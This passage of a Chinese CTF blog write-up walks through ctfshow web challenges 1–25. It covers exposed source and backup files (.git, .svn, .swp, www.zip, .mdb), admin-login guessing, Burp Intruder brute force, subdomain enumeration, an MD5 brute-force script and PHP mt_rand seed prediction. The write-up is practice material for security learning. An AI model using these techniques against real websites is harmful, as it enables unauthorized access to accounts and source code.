+<p>打开网页提示无法查看源代码，右键也使用不了，那我们就在url前面加上<code>view-source:</code></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">view-source:http:&#x2F;&#x2F;83a83588-671e-4a94-9c6f-6857f9e20c2f.chall.ctf.show&#x2F;</span><br></pre></td></tr></table></figure>
+<p>访问后即可获得flag</p>
+<h3 id="web3"><a class="header-anchor" href="#web3">¶</a>web3</h3>
+<p>右键源码也没看到信息，去查看一下请求头和响应头，在响应头这里找到flag<br>
+<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/web3/58CPJ8K6U1MK55EAIOYX6%24D.png" alt=""></p>
+<h3 id="web4"><a class="header-anchor" href="#web4">¶</a>web4</h3>
+<p>题目提示robots，所以我们直接访问<code>http://c6f215bf-6c3e-4a21-949b-1c37d603ca56.chall.ctf.show/robots.txt</code><br>
+<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/web4/%28SHD3YCKR5EX_PFSJJJ~%28KT.png" alt=""><br>
+然后根据提示，再访问flagishere.txt，即可得到flag<br>
+<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/web4/8S25%29G2%40%25%7BLSCUTWJL%24FJJ1.png" alt=""></p>
+<h3 id="web5"><a class="header-anchor" href="#web5">¶</a>web5</h3>
+<p>题目提示是phps源码泄露，于是在index.php后面加上s，即构造url如下</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;69ba9522-1aaf-4726-b2df-360c5c88d1ac.chall.ctf.show&#x2F;index.phps</span><br></pre></td></tr></table></figure>
+<p>访问后弹出一个下载文件，下载后打开文件得到flag<br>
+<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/web5/XL%7D%60G7X%5BG1ZPH%60HYCE__%40%7DR.png" alt=""></p>
+<h3 id="web6"><a class="header-anchor" href="#web6">¶</a>web6</h3>
+<p>题目提示www.zip源码泄露，于是构造url访问下载压缩包</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;da7afaa3-8d2b-4ae3-aa90-a0945c88ba15.chall.ctf.show&#x2F;www.zip</span><br></pre></td></tr></table></figure>
+<p>在压缩包中有一个fl000g.txt文件，打开内容为：flag{flag_here}，本来以为这是flag，然后提交错误了。接着访问</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;da7afaa3-8d2b-4ae3-aa90-a0945c88ba15.chall.ctf.show&#x2F;fl000g.txt</span><br></pre></td></tr></table></figure>
+<p>得到正确的flag<br>
+<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/web6/%29%29EZQI_I6W%60%25OY7_%28GGJI%5B9.png" alt=""></p>
+<h3 id="web7"><a class="header-anchor" href="#web7">¶</a>web7</h3>
+<p>根据提示，是个git泄露问题，访问.git/index.php即可，即构造url如下：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;e85f4c26-faf9-4ace-a049-4f1b4587ad44.chall.ctf.show&#x2F;.git&#x2F;index.php</span><br></pre></td></tr></table></figure>
+<p>访问后就能得到flag</p>
+<h3 id="web8"><a class="header-anchor" href="#web8">¶</a>web8</h3>
+<p>根据提示，本题考查的是svn泄露</p>
+<blockquote>
+<p>SVN（subversion）是源代码版本管理软件。 在使用SVN管理本地代码过程中，会自动生成一个隐藏文件夹，其中包含重要的源代码信息。但一些网站管理员在发布代码时，不愿意使用‘导出’功能，而是直接复制代码文件夹到WEB服务器上，这就使隐藏文件夹被暴露于外网环境，这使得渗透工程师可以借助其中包含版本信息追踪的网站文件，逐步摸清站点结构。 在服务器上布署代码时。如果是使用 svn checkout 功能来更新代码，而没有配置好目录访问权限，则会存在此漏洞。黑客利用此漏洞，可以下载整套网站的源代码。</p>
+</blockquote>
+<p>我们构造url访问，即可获得flag</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;a79a4695-f024-44dd-af3e-4eb6c2720be7.chall.ctf.show&#x2F;.svn&#x2F;</span><br></pre></td></tr></table></figure>
+<h3 id="web9"><a class="header-anchor" href="#web9">¶</a>web9</h3>
+<p>本题考查的是vim的缓存泄露</p>
+<blockquote>
+<p>vim编辑文本时会创建一个临时文件，如果程序正常退出，临时文件自动删除，如果意外退出就会保留，当vim异常退出后，因为未处理缓存文件，导致可以通过缓存文件恢复原始文件内容。而本题的情景就是电脑死机了意外退出，导致存在临时文件</p>
+</blockquote>
+<p>构造url如下，下载.swp后缀结尾的文件</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;0b4ba9f5-92a1-42fa-ba28-49cff3f8400e.chall.ctf.show&#x2F;index.php.swp</span><br></pre></td></tr></table></figure>
+<p>打开文件即可获取flag</p>
+<h3 id="web10"><a class="header-anchor" href="#web10">¶</a>web10</h3>
+<p>题目提示cookie，然后我们查看一下请求头，发现cookie数据为flag<br>
+<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/web10/5%5BL%7B~%7BV%24%245%254B7%5D67~%29B5CX.png" alt=""><br>
+我们解一下url编码，得到flag<br>
+<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/web10/%5DCN%2579K%24A9%280%24%60%240_TOFG%28E.png" alt=""></p>
+<h3 id="web11"><a class="header-anchor" href="#web11">¶</a>web11</h3>
+<p>根据提示，查询对ctfshow域名进行dns查询，查看TXT记录<br>
+阿里云查询链接：<a href="https://zijian.aliyun.com/">https://zijian.aliyun.com/</a><br>
+<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/web11/RDP905P_SOZF0HM725N3%7DJV.png" alt=""><br>
+获取flag成功</p>
+<h3 id="web12"><a class="header-anchor" href="#web12">¶</a>web12</h3>
+<p>根据题目提示，我们访问robots.txt，获取到后台地址<br>
+<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/web12/%24%24%28H%2954_BF%5DPS%7B06RN_M%7B7O.png" alt=""><br>
+然后我们访问一下后台</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;c25a456d-63f7-497e-9170-0365a9cdce53.chall.ctf.show&#x2F;admin&#x2F;</span><br></pre></td></tr></table></figure>
+<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/web12/3UKIBC9YJVM%40%7D6V%29O%28LT%291G.png" alt=""><br>
+账号名直接盲猜admin，密码是网站底部的这串数字，372619038<br>
+<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/web12/ZIA0BV2O2KFNIR~5%24%282T2DN.png" alt=""><br>
+登录进来后，获取到flag<br>
+<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/web12/OD2%603%24A%4083R%5BL%287A%5DGC%24Z%5B2.png" alt=""></p>
+<h3 id="web13"><a class="header-anchor" href="#web13">¶</a>web13</h3>
+<p>在网站找到一个超链接<br>
+<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/web13/JDUYP_%7D%24%24HV%5B%7BUGOENSK%7BLB.png" alt=""><br>
+访问后，发现开发者在文档中写了自己的后台地址和账号密码<br>
+<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/web13/Q%25%25%40CO8%29ZM%40M1%29_%7BMLDU6P6.png" alt=""><br>
+这里把your-domain换成自己的做题环境，访问后台地址</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;e63907cd-33af-4c57-b605-4f7e04928e43.chall.ctf.show&#x2F;system1103&#x2F;login.php</span><br></pre></td></tr></table></figure>
+<p>输入账号和密码后得到flag<br>
+<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/web13/1G7F~2%7D~NO048WQL%5D1LFUTR.png" alt=""></p>
+<h3 id="web14"><a class="header-anchor" href="#web14">¶</a>web14</h3>
+<p>打开网站，根据提示访问<code>http://4696e930-9cb3-47fd-a00b-c671f82fe4a4.chall.ctf.show/editor/</code><br>
+<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/web14/Y%5B8CN%60PAKNL%7BV%25SICU%60LH56.png" alt=""><br>
+看到一个编辑器，在flash的上传中，发现有个文件空间<br>
+<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/web14/617KH%5BRRFKY%5D4L%5BI%5DW~UXA3.png" alt=""><br>
+点击文件空间，发现爆出了目录<br>
+<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/web14/%25U17ETN4D42GP3~TG%7D%25N3M8.png" alt=""><br>
+找了找，flag在var/www/html/nothinghere/fl000g.txt中，于是构造url访问</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;4696e930-9cb3-47fd-a00b-c671f82fe4a4.chall.ctf.show&#x2F;nothinghere&#x2F;fl000g.txt</span><br></pre></td></tr></table></figure>
+<p>得到flag<br>
+<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/web14/%60_%28G6DSOG5TBQLZLDH08F7V.png" alt=""></p>
+<h3 id="web15"><a class="header-anchor" href="#web15">¶</a>web15</h3>
+<p>根据题目提示邮箱，在网页底部发现一个邮箱<br>
+<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/web15/HK_MLVPS3%246282SAV6YPFIM.png" alt=""><br>
+再url后面加上admin访问一下后台<br>
+<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/web15/VFRR%5DS8%60%60%7DV7%5D%251%25_2QAGS7.png" alt=""><br>
+有一个忘记密码选项，点击一下<br>
+<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/web15/%24OSUPYKMZZOORSX80VE63S2.png" alt=""><br>
+有密保问题，联想到qq邮箱，搜索一下qq<br>
+<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/web15/8%24BYJYK%5B7%251M3N0TF%60F%60VK2.png" alt=""><br>
+得到地址为西安，于是提交西安<br>
+<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/web15/I%5D%5B9%7BXDD98TS%5BMO%5DB%28_%7B%29%60P.png" alt=""><br>
+得到密码为admin7789，账号还是admin，登录后获得flag</p>
+<h3 id="web16"><a class="header-anchor" href="#web16">¶</a>web16</h3>
+<p>根据题目提示，存在探针</p>
+<blockquote>
+<p>php探针是用来探测空间、服务器运行状况和PHP信息用的，探针可以实时查看服务器硬盘资源、内存占用、网卡流量、系统负载、服务器时间等信息。是一个查看服务器信息的工具。<br>
+比如查看服务器支持什么，不支持什么，空间速度等等状况！</p>
+</blockquote>
+<p>于是访问<code>http://e42c0d7a-d052-485d-bb09-a7c68a6d0214.chall.ctf.show/tz.php</code><br>
+<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/web16/CL_7ZWZ3%24~0%7D3D0Q1PPD86H.png" alt=""><br>
+再点击phpinfo查看信息<br>
+<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/web16/_NM4E%5B4%60TFQ%7DPP%60%240P2A~72.png" alt=""><br>
+在页面搜索一下ctfshow，即可得到flag<br>
+<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/web16/MK%7B%28X5DI52%29LVAPG%7D%7BTJSQE.png" alt=""></p>
+<h3 id="web17"><a class="header-anchor" href="#web17">¶</a>web17</h3>
+<p>根据题目，查找ctfer.com的真实ip，于是用fofa查找<br>
+<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/web17/%7BE3HVN%5DBT7C7%7BR%29_G%7DL%29ODI.png" alt=""><br>
+查到ip地址为：111.231.70.44，所以flag为：flag{111.231.70.44}</p>
+<h3 id="web18"><a class="header-anchor" href="#web18">¶</a>web18</h3>
+<p>打开是一个游戏，我们去找找它的文件，在js中发现了当分数大于100时，赋值的一串编码<br>
+<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/web18/_%60NIPJPH%606XG7%7BHCOPOJMWC.png" alt=""><br>
+我们拿去unicode解码一下<br>
+<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/web18/WHIID%5B%5BUR1Y%5DOL_G0K7H%247G.png" alt=""><br>
+根据提示，访问110.php，构造url</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;884e39f8-376a-4d61-9618-ee22fecc3327.chall.ctf.show&#x2F;110.php</span><br></pre></td></tr></table></figure>
+<p>访问后得到flag<br>
+<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/web18/%60OO6K~50K%60A%7B~0EC%24G%5D_52N.png" alt=""></p>
+<h3 id="web19"><a class="header-anchor" href="#web19">¶</a>web19</h3>
+<p>打开是一个登录框，右键查看一下源码<br>
+<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/web19/_KY%7DOY%5BDG6ICR%5DH9U~N%600%28E.png" alt=""><br>
+根据php源码，我们需要post发送用户名和密码过去</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">当用户名为admin</span><br><span class="line">密码为a599ac85a73384ee3219fa684296eaa62667238d608efa81837030bd1ce1bf04</span><br><span class="line">即可输出flag</span><br></pre></td></tr></table></figure>
+<p>构造发送post请求<br>
+<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/web19/%5DK48MGWOC%243%2555U6R%28YHEWA.png" alt=""><br>
+成功获取flag</p>
+<h3 id="web20"><a class="header-anchor" href="#web20">¶</a>web20</h3>
+<p>根据题目提示，是mdb文件泄露</p>
+<blockquote>
+<p>mdb文件是早期asp+access构架的数据库文件</p>
+</blockquote>
+<p>于是我们访问/db/db.mdb，即构造url如下访问</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;5c070a5e-3a51-4904-a668-4385dfa7e714.chall.ctf.show&#x2F;db&#x2F;db.mdb</span><br></pre></td></tr></table></figure>
+<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/web20/A%60M~%5B%5B9GGXE8%7DAG4%7D%29V2~6H.png" alt=""><br>
+下载db.mdb文件后，用记事本打开搜索flag<br>
+<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/web20/G8QY%29JHUVWV%60KE%40MU9K%7BXOT.png" alt=""><br>
+成功获取到flag</p>
+<h2 id="爆破-21-28"><a class="header-anchor" href="#爆破-21-28">¶</a>爆破(21-28)</h2>
+<h3 id="web21"><a class="header-anchor" href="#web21">¶</a>web21</h3>
+<p>题目给了一个zip文件，打开后解压是爆破的字典，我们抓包一下网址看看<br>
+<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/%E7%88%86%E7%A0%B4/web21/%7DJ%7BI5%243FC%5D0~HWVBF9YEZAA.png" alt=""><br>
+发现账号和密码都被base64了，我们发送到intruder模块，给爆破的位置加上$符圈住<br>
+<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/%E7%88%86%E7%A0%B4/web21/CNNU1O4C%40XHK3Y5JORN%60Q1V.png" alt=""><br>
+去base64解码一下看看格式<br>
+<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/%E7%88%86%E7%A0%B4/web21/XNGZCN%286QM%40%40S%40%29%5DCDH5810.png" alt=""><br>
+格式是账号:密码，那我们使用custom iterator(自定义迭代器)模块，首先第一个放账号admin<br>
+<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/%E7%88%86%E7%A0%B4/web21/CVUBPQE_TDC%60%282%7BNFWNJN66.png" alt=""><br>
+第二个放符号<code>:</code><br>
+<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/%E7%88%86%E7%A0%B4/web21/EE%24R8%28LNP_D4TP6_LGD%40WBX.png" alt=""><br>
+第三个放题目给的字典<br>
+<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/%E7%88%86%E7%A0%B4/web21/YDJT6U%5B3%7B%7B%5BW3%24LTQU%40S2I7.png" alt=""><br>
+接着再进行base64编码，还有把后面这个url编码字符最好取消掉<br>
+<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/%E7%88%86%E7%A0%B4/web21/BG65%608Y%28U%5D%5BZ_Z0Q9PIR%7B%40V.png" alt=""><br>
+然后就是attack开始爆破了<br>
+<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/%E7%88%86%E7%A0%B4/web21/I%40HP%40S%299HT%5DREAIMIUYYV8K.png" alt=""><br>
+爆破出密码，成功获得flag</p>
+<h3 id="web22"><a class="header-anchor" href="#web22">¶</a>web22</h3>
+<p>题目让我们去爆破ctfer.com域名，也就是去爆破子域名，直接上layer<br>
+<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/%E7%88%86%E7%A0%B4/web22/CNI3BQ%29BITHJIJ~2%7B6E%5DFC6.png" alt=""><br>
+爆破出有flag的子域名，访问后得到flag<br>
+<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/%E7%88%86%E7%A0%B4/web22/WW7DID%7BTYG1US%60G6%244MWXJI.png" alt=""></p>
+<h3 id="web23"><a class="header-anchor" href="#web23">¶</a>web23</h3>
+<p>打开看到php源码</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-03 11:43:51</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-03 11:56:11</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;token&#x27;</span>]))&#123;</span><br><span class="line">    $token = md5($_GET[<span class="string">&#x27;token&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span>(substr($token, <span class="number">1</span>,<span class="number">1</span>)===substr($token, <span class="number">14</span>,<span class="number">1</span>) &amp;&amp; substr($token, <span class="number">14</span>,<span class="number">1</span>) ===substr($token, <span class="number">17</span>,<span class="number">1</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>((intval(substr($token, <span class="number">1</span>,<span class="number">1</span>))+intval(substr($token, <span class="number">14</span>,<span class="number">1</span>))+substr($token, <span class="number">17</span>,<span class="number">1</span>))/substr($token, <span class="number">1</span>,<span class="number">1</span>)===intval(substr($token, <span class="number">31</span>,<span class="number">1</span>)))&#123;</span><br><span class="line">            <span class="keyword">echo</span> $flag;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
+<p>代码审计一下，输出flag需要满足两个条件</p>
+<blockquote>
+<p>第一，传入的token值经过md5加密后，第1位=第14位并且第14位=第17位<br>
+第二，第1位+第14位+第17位÷第1位等于第31位</p>
+</blockquote>
+<p>根据源码改一下，写个脚本</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Author：dota_st</span></span><br><span class="line"><span class="comment"> * Date：2021/2/2   10:48</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$dict = <span class="string">&quot;0123456789qwertyuiopasdfghjklzxcvbnm&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>($i = <span class="number">0</span>;$i&lt; <span class="number">36</span>;$i++)&#123;</span><br><span class="line">    <span class="keyword">for</span>($j = <span class="number">0</span>;$j&lt;<span class="number">36</span>;$j++)&#123;</span><br><span class="line">        $token = md5($dict[$i].$dict[$j]);</span><br><span class="line">        <span class="keyword">if</span>(substr($token, <span class="number">1</span>,<span class="number">1</span>)===substr($token, <span class="number">14</span>,<span class="number">1</span>) &amp;&amp; substr($token, <span class="number">14</span>,<span class="number">1</span>) ===substr($token, <span class="number">17</span>,<span class="number">1</span>))&#123;</span><br><span class="line">            <span class="keyword">if</span>((intval(substr($token, <span class="number">1</span>,<span class="number">1</span>))+intval(substr($token, <span class="number">14</span>,<span class="number">1</span>))+substr($token, <span class="number">17</span>,<span class="number">1</span>))/substr($token, <span class="number">1</span>,<span class="number">1</span>)===intval(substr($token, <span class="number">31</span>,<span class="number">1</span>)))&#123;</span><br><span class="line">                <span class="keyword">echo</span> (<span class="string">&quot;加密后的md5值为：&quot;</span>.$token).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">                <span class="keyword">echo</span> (<span class="string">&quot;解密后的值为：&quot;</span>.$dict[$i].$dict[$j]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>运行后得到满足的值，即3j<br>
+<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/%E7%88%86%E7%A0%B4/web23/1%40X%282I%7D%29WT%40%7DX%7B%7BC%7B%7DW%5BYO3.png" alt=""><br>
+于是构造url传参token=3j，获得flag<br>
+<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/%E7%88%86%E7%A0%B4/web23/%7DMZ8I%5BI%5BR%2441YZ%29P0%5DA8TU9.png" alt=""></p>
+<h3 id="web24"><a class="header-anchor" href="#web24">¶</a>web24</h3>
+<p>审计代码</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;r&#x27;</span>]))&#123;</span><br><span class="line">    $r = $_GET[<span class="string">&#x27;r&#x27;</span>];</span><br><span class="line">    mt_srand(<span class="number">372619038</span>);</span><br><span class="line">    <span class="keyword">if</span>(intval($r)===intval(mt_rand()))&#123;</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">echo</span> system(<span class="string">&#x27;cat /proc/version&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>发现其实这是伪随机数，因为mt_srang已经固定了，我们写个代码运行一下</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Author：dota_st</span></span><br><span class="line"><span class="comment"> * Date：2021/2/2   11:31</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">mt_srand(<span class="number">372619038</span>);</span><br><span class="line">$result = intval(mt_rand());</span><br><span class="line"><span class="keyword">echo</span> $result;</span><br></pre></td></tr></table></figure>
+<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/%E7%88%86%E7%A0%B4/web24/7%28XX9%5BUBRX8TG%60%5BP4F8M%29%5BA.png" alt=""><br>
+得到1155388967，所以构成?r=1155388967即可获得flag<br>
+<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/%E7%88%86%E7%A0%B4/web24/N9%294NSPFPC1BUE%28KK%24%7B7Q7R.png" alt=""></p>
+<h3 id="web25"><a class="header-anchor" href="#web25">¶</a>web25</h3>
+<p>首先审计代码</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-03 13:56:57</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-03 15:47:33</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;r&#x27;</span>]))&#123;</span><br><span class="line">    $r = $_GET[<span class="string">&#x27;r&#x27;</span>];</span><br><span class="line">    mt_srand(hexdec(substr(md5($flag), <span class="number">0</span>,<span class="number">8</span>)));</span><br><span class="line">    $rand = intval($r)-intval(mt_rand());</span><br><span class="line">    <span class="keyword">if</span>((!$rand))&#123;</span><br><span class="line">        <span class="keyword">if</span>($_COOKIE[<span class="string">&#x27;token&#x27;</span>]==(mt_rand()+mt_rand()))&#123;</span><br><span class="line">            <span class="keyword">echo</span> $flag;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> $rand;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">echo</span> system(<span class="string">&#x27;cat /proc/version&#x27;</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
+<p>这次种子没有给出，但发现一个关键地方，就是我们可以把传入的r设置为0，即?r=0，可以输出$rand的值，此时$rand=mt_rand()的值，也就是随机数的值<br>
+<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/%E7%88%86%E7%A0%B4/web25/NM0%607T~RI%28QV7UQDCA%5B5%7DQT.png" alt=""><br>
+获得随机数为86715576，这个时候我们使用逆推工具尝试逆推出种子</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">工具地址：https:&#x2F;&#x2F;github.com&#x2F;Al1ex&#x2F;php_mt_seed</span><br></pre></td></tr></table></figure>
+<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/%E7%88%86%E7%A0%B4/web25/_0%286QB7%245ME%24XVJ%5B2P8HMT0.png" alt=""><br>
+得到种子为4188754181，因为$_COOKIE[‘token’]的值要等于两个随机数相加，于是我们写个脚本</p>
